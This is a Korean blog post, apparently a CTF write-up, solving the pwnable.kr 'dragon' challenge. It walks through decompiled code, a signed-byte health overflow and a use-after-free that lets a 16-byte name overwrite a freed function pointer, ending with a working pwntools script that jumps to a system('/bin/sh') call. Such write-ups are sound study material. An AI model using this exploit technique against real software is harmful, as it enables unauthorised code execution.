---
title: 2st Problem - dowoo
date: 2018-12-13
tags: [pwnable]
author: arizona
type: post
---

### http://pwnable.kr - Rookiss - dragon

{{<r "deadline">}} - 2018.12.20 {{<p "18:00">}}

일단 백문이 불여일견이라고.. 한번 해보자. 
nc pwnable.kr 9004

```sh
Welcome to Dragon Hunter!
Choose Your Hero
[ 1 ] Priest
[ 2 ] Knight
```

흠.. 한마디로 드래곤을 죽이는 것이다.. 뭐 직접 해보면 알겠지 스킵!

음.. 근데 어미드래곤이나 베이비 드래곤이나 어의 없게 한틱남기고 못죽인다. 뭣이런 ㅈ같은 게임이 다있누..
한껏 무기력함을 느끼고 바이너리를 받아서 분석해보자! 
http://pwnable.kr/bin/dragon

이번엔 c 언어를 주지않으셨다... 하... 아이다..쓸까?? 쓰자쓰자 ! ㅇㅋㅇㅋ 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("Welcome to Dragon Hunter!");
  PlayGame();
  return 0;
}
```

와우.. gdb 로 보다가 이걸로보니까.. 넘모 깔끔한거있지..

```c
int PlayGame()
{
  int result; // eax

  while ( 1 )
  {
    while ( 1 )
    {
      puts("Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight");
      result = GetChoice();
      if ( result != 1 && result != 2 )
        break;
      FightDragon(result);
    }
    if ( result != 3 )
      break;
    SecretLevel();
  }
  return result;
}
```
맨처음 1, 2를 누르는게 GetChice() 고,, 드래곤이랑 싸우는게 FightDragon() 이고,,
엥 3번을 누르면 SecretLevel() 이 나온단다.. 안써놨었네 벌써부터 게싱능력 딸리는게 드러난다.
입력할수있는 함수가.. GetChoice, FightDragon, SecretLevel 이거 세개다. 다봐야겠다 ㅠㅠ 취약점찾아보까?

```c
int GetChoice()
{
  int v1; // [esp+1Ch] [ebp-Ch]

  __isoc99_scanf("%d", &v1);
  while ( getchar() != 10 ); return v1;
}
```

윽... 이함수는 아니야..

```sh
void __cdecl FightDragon(int a1)
{
  char v1; // al
  void *v2; // ST1C_4
  int v3; // [esp+10h] [ebp-18h]
  _DWORD *ptr; // [esp+14h] [ebp-14h]
  _DWORD *v5; // [esp+18h] [ebp-10h]

  ptr = malloc(0x10u);
  v5 = malloc(0x10u);
  v1 = Count++;
  if ( v1 & 1 )
  {
    v5[1] = 1;
    *((_BYTE *)v5 + 8) = 80;
    *((_BYTE *)v5 + 9) = 4;
    v5[3] = 10;
    *v5 = PrintMonsterInfo;
    puts("Mama Dragon Has Appeared!");
  }
  else
  {
    v5[1] = 0;
    *((_BYTE *)v5 + 8) = 50;
    *((_BYTE *)v5 + 9) = 5;
    v5[3] = 30;
    *v5 = PrintMonsterInfo;
    puts("Baby Dragon Has Appeared!");
  }
  if ( a1 == 1 )
  {
    *ptr = 1;
    ptr[1] = 42;
    ptr[2] = 50;
    ptr[3] = PrintPlayerInfo;
    v3 = PriestAttack((int)ptr, v5);
  }
  else
  {
    if ( a1 != 2 )
      return;
    *ptr = 2;
    ptr[1] = 50;
    ptr[2] = 0;
    ptr[3] = PrintPlayerInfo;
    v3 = KnightAttack((int)ptr, v5);
  }
  if ( v3 )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v2 = malloc(0x10u);
    __isoc99_scanf("%16s", v2);
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v5)(v5);
  }
  else
  {
    puts("\nYou Have Been Defeated!");
  }
  free(ptr);
}
```
흠 v1 은 랜덤요소가 없으니 무조건 baby 다음 Mommy 가 나온다.
ptr, V5 는 heap 에 할당한 구조체구..

딱보니까 dragon 구조체의 시작은 V5 이고,,

{{<p "V5 + 8">}} = 드래곤의 체력이 써있음!\
{{<p "V5 + 9">}} = 한턴이 끝나고 드래곤이 회복하는 값이 저장되있음\

{{<r "여기서.. 이상함을 바로 느낀다면">}} 당신은 천제... 하지만 나는 아하 그렇군! 하고 지나쳐나갔다.\
뭐 쭈욱 보자면 a1 이 맨처음 우리가 썼던 직업고르기 숫자고,\
ptr 은 싸우는사람의 구조체고..

{{<p "ptr + 0">}} = 프리스트는 1, 기사는 2 가 써있음\
{{<p "ptr + 4">}} = 체력\
{{<p "ptr + 8">}} = 마나\
{{<p "ptr + 12">}} = PrintPlayerInfo ?\

쨋든.. 여기서 봐야됄 부분은.. 바로 체력을 담당하는 V5+8 부분이 한 바이트.. 즉 -127 ~ 127 범위밖에 가질수 없다는 소리이다. 즉 드래곤 체력을 계속 회복시켜줘서 127 이 넘으면 죽일수있다는소리..

공격과정을 보자. 

```c
int __cdecl PriestAttack(int a1, void *ptr)
{
  int v2; // eax

  do
  {
    (*(void (__cdecl **)(void *))ptr)(ptr);
    (*(void (__cdecl **)(int))(a1 + 12))(a1);
    v2 = GetChoice();
    switch ( v2 )
    {
      case 2:
        puts("Clarity! Your Mana Has Been Refreshed");
        *(_DWORD *)(a1 + 8) = 50;
        printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));
        *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);
        printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));
        *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
        break;
      case 3:
        if ( *(_DWORD *)(a1 + 8) <= 24 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          puts("HolyShield! You Are Temporarily Invincible...");
          printf("But The Dragon Heals %d HP!\n", *((char *)ptr + 9));
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
          *(_DWORD *)(a1 + 8) -= 25;
        }
        break;
      case 1:
        if ( *(_DWORD *)(a1 + 8) <= 9 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          printf("Holy Bolt Deals %d Damage To The Dragon!\n", 20);
          *((_BYTE *)ptr + 8) -= 20;
          *(_DWORD *)(a1 + 8) -= 10;
          printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));
          *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);
          printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
        }
        break;
    }
    if ( *(_DWORD *)(a1 + 4) <= 0 )
    {
      free(ptr);
      return 0;
    }
  }
  while ( *((_BYTE *)ptr + 8) > 0 );
  free(ptr);
  return 1;
}
```

여기서 핵심은.. 이 경기에서 지든 이기든 ptr 을 free 해준다는것이다.. 이것은 dragon 의 구조체 주소를 ptr 로 받았기 때문에, 곧 dragon 을 free 해준다는 것과 같다.

자 그럼 이렇게 죽이면 if(v3) 저 부분이 나타난다. 
그다음.. ` __isoc99_scanf("%16s", v2);` 짜잔 무려 16 바이트를 쓸수있게 해준다..!
근데 아까 free 해준 dragon 과 똑같은 16바이트잖아?? 이거 드래곤 구조체 가 할당되었단 heap
주소에 덮어씌우는 꼴이 된다.

근데 그다음 희괴한 c 코드가 보이는데.. 무슨일을 하는지 어셈으로 봐보자.

```sh
   0x080488c0 <+386>:   mov    eax,DWORD PTR [ebp-0x10]
   0x080488c3 <+389>:   mov    eax,DWORD PTR [eax]
   0x080488c5 <+391>:   mov    edx,DWORD PTR [ebp-0x10]
   0x080488c8 <+394>:   mov    DWORD PTR [esp],edx
   0x080488cb <+397>:   call   eax
```

띠용.. ebp - 0x10 에 써있던 값의 주소값에 해당하는 함수를 불러버린다.. 뭐지
ebp - 0x10 은 dragon 구조체가 저장되있어던 주소다. 즉 아까 우리가 scanf 로 받았던 그 주소가 eax 에 들어가게 되버린다. 호모나 섹상에. 즉 우리는 return 주소를 바꿀수 있게 됐다. 
마지막으로 SecretLevel 함수를 보면,

```sh
unsigned int SecretLevel()
{
  char s1; // [esp+12h] [ebp-16h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Welcome to Secret Level!\nInput Password : ");
  __isoc99_scanf("%10s", &s1);
  if ( strcmp(&s1, "Nice_Try_But_The_Dragons_Won't_Let_You!") )
  {
    puts("Wrong!\n");
    exit(-1);
  }
  system("/bin/sh");
  return __readgsdword(0x14u) ^ v2;
}
```
와우 system("bin/sh") 저기로 뛰면 되것당. gdb 로 봐보쟙
```sh
   0x08048dbf <+71>:    mov    DWORD PTR [esp],0x804935c
   0x08048dc6 <+78>:    call   0x8048530 <system@plt>
```
즉, 0x8048dbf 주소로 뛰어주면 된당.

파이썬 코드로 작성해보쟈.

```sh
from pwn import  *

p = remote("pwnable.kr",9004)

p.send("2\n2\n1\n"+"3\n3\n2\n"*4+"\xbf\x8d\x04\x08")

p.interactive()
```

오후 간단쓰..